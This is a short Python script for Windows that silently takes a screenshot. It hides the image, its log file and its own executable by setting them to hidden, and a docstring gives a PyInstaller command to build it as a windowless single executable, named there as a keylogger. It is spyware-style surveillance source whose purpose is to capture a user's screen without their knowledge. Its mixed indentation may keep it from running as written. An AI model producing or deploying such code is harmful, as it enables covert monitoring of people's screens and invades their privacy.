"""
pyinstaller --onefile --hidden-import=ImageGrab --hidden-import=os --hidden-import=win32con --hidden-import=win32api --hidden-import=argparse --hidden-import=logging --hidden-import=datetime -w keylogger.py
"""

import logging,argparse,datetime,os,win32api,win32con
from PIL import ImageGrab

parser = argparse.ArgumentParser(description='A simple python screenshooter')
parser.add_argument("-v", "--verbose", help="Log file",action="store_true")
parser.add_argument("-i", "--hidden", help="Hidden script",action="store_true")
args = parser.parse_args()

if args.verbose:
	LOG_FILENAME = "screenshot.log"
	logging.basicConfig(filename=LOG_FILENAME,level=logging.DEBUG)
	try:
   		win32api.SetFileAttributes(LOG_FILENAME,win32con.FILE_ATTRIBUTE_HIDDEN)
   	except Exception as e:
   		logging.exception("HIDE EXCEPTION")
	logging.debug("Setting log file hidden ... Done !")

if args.hidden:
    try:
    	win32api.SetFileAttributes("screenshot.exe",win32con.FILE_ATTRIBUTE_HIDDEN)
    except Exception as e:
    	logging.exception("HIDE EXCEPTION")
    logging.debug("Setting script file hidden ... Done !")

now = datetime.datetime.now()
hour = str(now.hour)
minute = str(now.minute)
second = str(now.second)
SCREEN_SHOT= "screen_"+hour+"_"+minute+"_"+second+".jpeg"
try:
	ImageGrab.grab().save(SCREEN_SHOT, "JPEG")
	self_path = os.path.abspath(SCREEN_SHOT)
	win32api.SetFileAttributes(SCREEN_SHOT,win32con.FILE_ATTRIBUTE_HIDDEN)
	logging.debug("Setting output file hidden ... Done !")
except Exception as e:
    logging.exception("CAPTURE EXCEPTION")

logging.debug("Close script ... Done !")